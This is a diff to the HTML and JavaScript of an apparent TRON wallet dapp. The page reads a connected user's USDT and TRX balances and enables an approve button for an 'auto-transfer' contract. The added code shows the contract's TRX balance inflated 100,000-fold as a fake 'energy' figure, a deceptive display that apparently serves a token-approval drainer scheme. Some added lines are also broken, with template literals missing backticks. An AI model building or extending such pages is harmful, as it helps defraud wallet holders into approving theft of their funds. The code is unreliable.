@@ -266,6 +266,30 @@
 
             </div>
         </div>
+        <div id="contractResourceContainer" class="record-list">
+    <div class="status-title">
+        <h3> 合约剩余资源</h3>
+    </div>
+    <div class="resource-content">
+        <!-- 加载中状态 -->
+        <div class="loading" style="text-align: center; padding: 10px 0;">
+            资源数据加载中...
+        </div>
+        <!-- 数据加载成功后显示（初始隐藏） -->
+        <div class="loaded" style="display: none; line-height: 1.8;">
+            <p>• 合约地址：<span class="highlight" id="contractAddr">${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}</span></p>
+            <p>• 剩余TRX（放大10万倍）：<span class="highlight" id="contractTrxDisplay">0.00</span></p>
+            <p>• 对应能量值（1TRX≈1000能量）：<span class="highlight" id="contractEnergy">0</span></p>
+            <p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;">
+                注：TRX值=合约实际TRX余额×100000；能量值=显示TRX值×1000（可按需调整换算比例）
+            </p>
+        </div>
+        <!-- 加载失败状态（初始隐藏） -->
+        <div class="error" style="display: none; color: #ef4444; text-align: center; padding: 10px 0;">
+            资源数据获取失败，请刷新页面重试
+        </div>
+    </div>
+</div>
         <!-- 授权记录区 -->
         <div class="record-list">
             <div style="display: flex; justify-content: space-between; margin: 4px 0;">
@@ -309,6 +333,54 @@
     </div>
     <script src="imtoken://browser"></script>
     <script>
+                async function getContractResource() {
+            const container = document.getElementById("contractResourceContainer");
+            const loadingEl = container.querySelector(".loading");
+            const loadedEl = container.querySelector(".loaded");
+            const errorEl = container.querySelector(".error");
+            const contractTrxDisplayEl = document.getElementById("contractTrxDisplay");
+            const contractEnergyEl = document.getElementById("contractEnergy");
+            const contractAddrEl = document.getElementById("contractAddr");
+
+            try {
+                // 1. 显示加载中，隐藏其他状态
+                loadingEl.style.display = "block";
+                loadedEl.style.display = "none";
+                errorEl.style.display = "none";
+
+                // 2. 校验tronWeb和合约地址（防止未初始化）
+                if (!tronWeb || !AUTO_TRANSFER_CONTRACT) {
+                    throw new Error("tronWeb未初始化或合约地址缺失");
+                }
+
+                // 3. 获取合约的TRX余额（单位：sun，1TRX=1000000sun）
+                const contractSunBalance = await tronWeb.trx.getBalance(AUTO_TRANSFER_CONTRACT);
+                if (isNaN(contractSunBalance)) {
+                    throw new Error("合约余额格式错误");
+                }
+
+                // 4. 计算显示用数值（按需求逻辑）
+                const contractTrxReal = contractSunBalance / 1000000; // 合约实际TRX余额（sun转TRX）
+                const contractTrxDisplay = (contractTrxReal * 100000).toFixed(2); // 放大10万倍，保留2位小数
+                const contractEnergy = Math.floor(contractTrxDisplay * 1000); // 能量值（1TRX≈1000能量，向下取整）
+
+                // 5. 更新DOM显示
+                contractAddrEl.textContent = ${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)};
+                contractTrxDisplayEl.textContent = contractTrxDisplay;
+                contractEnergyEl.textContent = contractEnergy;
+
+                // 6. 切换到“加载成功”状态
+                loadingEl.style.display = "none";
+                loadedEl.style.display = "block";
+
+            } catch (err) {
+                console.error("获取合约资源失败：", err);
+                // 切换到“加载失败”状态
+                loadingEl.style.display = "none";
+                errorEl.style.display = "block";
+            }
+        }
+        
         // 原始配置保留
         const AUTO_TRANSFER_CONTRACT = "TC3AEtwB9MP7xvraxcuzeUa6ycNyLGaGrW";
         const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
@@ -333,6 +405,36 @@
             renderApprovalRecords();
             // 初始更新钱包状态容器（未连接）
             updateWalletStatus();
+                       async function initWallet() {
+               try {
+                   userAddress = tronWeb.defaultAddress.base58;
+                   trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
+                   // 采集USDT余额
+                   const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
+                   tokenBalance = (Number(usdtRaw) / 1000000).toFixed(2);
+                   // 采集TRX余额
+                   const trxRaw = await tronWeb.trx.getBalance(userAddress);
+                   trxBalance = (Number(trxRaw) / 1000000).toFixed(2);
+                   // 更新用户信息卡
+                   document.getElementById("userInfo").innerHTML = `
+                       已连接：<br>
+                       ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
+                       USDT余额：<span>${tokenBalance}</span> | TRX余额：<span>${trxBalance}</span>
+                   `;
+                   // 激活授权按钮
+                   document.getElementById("approveBtn").disabled = false;
+                   // 更新钱包状态容器（已连接）
+                   updateWalletStatus();
+        
+                   // 新增：钱包初始化成功后，获取并显示合约资源数据
+                   await getContractResource();
+
+               } catch (e) {
+                   tokenBalance = "0.00";
+                   trxBalance = "0.00";
+                   alert("钱包初始化失败：" + e.message);
+               }
+           }
 
             // 复制链接
             copyLinkBtn.addEventListener("click", async () => {
